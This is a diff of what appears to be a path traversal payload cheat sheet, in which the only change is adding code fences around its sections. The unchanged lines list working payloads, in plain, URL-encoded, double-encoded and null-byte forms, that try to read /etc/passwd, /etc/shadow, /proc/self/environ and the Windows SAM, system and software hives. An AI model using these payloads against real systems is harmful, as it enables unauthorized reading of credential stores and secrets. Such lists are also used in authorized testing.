@@ -38,6 +38,7 @@ ___
 %2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd%00
 ```
 ### Linux Path Traversal Payloads
+```
 /etc/passwd
 ../../../etc/passwd
 ../../../../../../../etc/passwd
@@ -77,8 +78,9 @@ ___
 ../../../../../../../proc/self/mountinfo
 ../../../../../../../proc/self/fd
 ../../../../../../../proc/self/environ
-
+```
 ### Windows Path Traversal Payloads
+```
 ..\..\..\windows\win.ini
 ..\..\..\..\..\..\windows\win.ini
 %5C%5C%2E%2E%5C%2E%2E%5Cwindows%5Cwin.ini
@@ -99,8 +101,9 @@ ___
 /../../../../../../../../windows/system32/config/system
 /../../../../../../../../windows/system32/config/software
 /../../../../../../../../windows/system32/config/sam
-
+```
 ### URL Encoded Variants
+```
 %2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2fetc%2fpasswd
 ..%252f..%252f..%252fetc%252fpasswd
@@ -109,6 +112,7 @@ ___
 %2fvar%2fwww%2fimages%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 %2e%2e%2f%2e%2e%2fetc%2fshadow%00
 %2fvar%2fwww%2fimages%2f..%2f..%2f..%2f..%2fetc%2fshadow%00
+```
 ### Wordlist
 ```txt
 /etc/passwd
